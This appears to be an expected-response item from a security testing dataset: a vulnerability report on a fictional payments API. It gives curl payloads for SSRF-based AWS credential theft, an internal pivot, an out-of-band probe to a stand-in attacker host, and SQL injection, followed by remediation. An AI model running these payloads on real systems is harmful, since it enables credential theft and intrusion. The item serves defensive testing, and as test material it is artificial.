# Expected Response

## System
- System: PayBridge Transaction API v2.0.0
- Domain: FINTECH / PAYMENTS GATEWAY
- Example ID: INJ-0120
- Risk ID: RISK-INJ-120

## Findings

### 1. SSRF (Server-Side Request Forgery) on `/api/v1/orders?filter=` — Primary (Declared Vulnerability)

The `filter` parameter on `GET /api/v1/orders` is passed directly to a backend `fetch()` call used for payment data enrichment without URL allowlist validation. An attacker can supply an arbitrary URL to make the PayBridge server send authenticated HTTP requests to internal services, cloud metadata endpoints, or attacker-controlled servers — potentially leaking cloud credentials, internal payment processor API keys, or allowing pivot into the internal payments network.

HAR shows `filter=http://169.254.169.254/latest/meta-data/` returning HTTP 200 with SQL order records. The HAR response shows SQL data (SQL code path executed first) rather than metadata content — both injection surfaces are present on the same endpoint. The SSRF surface is confirmed by the fetch() code path documented in Section 3.0.

**Step 1 — Baseline:**
```bash
curl -s "https://api.paybridge-trans.example.com/api/v1/orders?filter=normalvalue" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```
**Expected:** Returns matching payment orders.

**Step 2 — SSRF probe: AWS metadata service (primary HAR attack):**
```bash
curl -s "https://api.paybridge-trans.example.com/api/v1/orders?filter=http://169.254.169.254/latest/meta-data/" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```
**Vulnerable outcome:** AWS metadata listing or SQL order records returned (both confirm SSRF/SQLi surfaces). In production SSRF: `ami-id`, `instance-type`, IAM role names exposed.

**Step 3 — SSRF: AWS IAM credential theft:**
```bash
curl -s "https://api.paybridge-trans.example.com/api/v1/orders?filter=http://169.254.169.254/latest/meta-data/iam/security-credentials/paybridge-service-role" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```
**Vulnerable outcome:** `AccessKeyId`, `SecretAccessKey`, `Token` for PayBridge's AWS IAM role — attacker can access S3 transaction records, RDS databases, SQS payment queues.

**Step 4 — SSRF: internal payment processor pivot:**
```bash
curl -s "https://api.paybridge-trans.example.com/api/v1/orders?filter=http://internal-payments.paybridge.local/admin/config" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```
**Vulnerable outcome:** Internal payment processor admin config exposed — PCI DSS violation (cardholder data environment accessed from external boundary).

**Step 5 — SSRF: out-of-band detection (verify SSRF without reflected response):**
```bash
curl -s "https://api.paybridge-trans.example.com/api/v1/orders?filter=http://attacker-controlled.example.com/ssrf-probe" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```
**Vulnerable outcome:** HTTP request logged at attacker server with PayBridge's server IP and `Authorization: Bearer <ENRICHMENT_API_KEY>` header — API key leaked via SSRF.

### 2. SQL Injection on `/api/v1/orders?filter=` — Secondary (Code Snippet Evidence, RISK-INJ-120)

SQL path: raw pg string concatenation. `db_owner` privileges confirmed.

**Step 6 — SQL tautology dump all orders:**
```bash
curl -s "https://api.paybridge-trans.example.com/api/v1/orders?filter=' OR 1=1 --" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```
**Vulnerable outcome:** All payment orders returned including admin account credentials — as evidenced in HAR response.

**Step 7 — Verbose SQL error fingerprint:**
```bash
curl -s "https://api.paybridge-trans.example.com/api/v1/orders?filter='" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```
**Expected (RISK-INJ-120 misconfiguration):** SQL syntax error leaking table/column names.

## Secure Outcome
```json
{ "error": "Invalid input", "code": 400 }
```

## Remediation
- Validate `filter` against a strict URL allowlist before passing to `fetch()` — never accept `169.254.*`, `10.*`, `172.16-31.*`, `127.*` or file:// schemes (RISK-INJ-120).
- Disable outbound HTTP from the payment API service except to explicitly whitelisted enrichment URLs.
- Replace raw SQL concatenation with parameterized queries (`pg.query('SELECT ... WHERE filter = $1', [filter])`).
- Restrict DB account to SELECT/INSERT on required tables (remove `db_owner`).
- Disable verbose error messages in production.
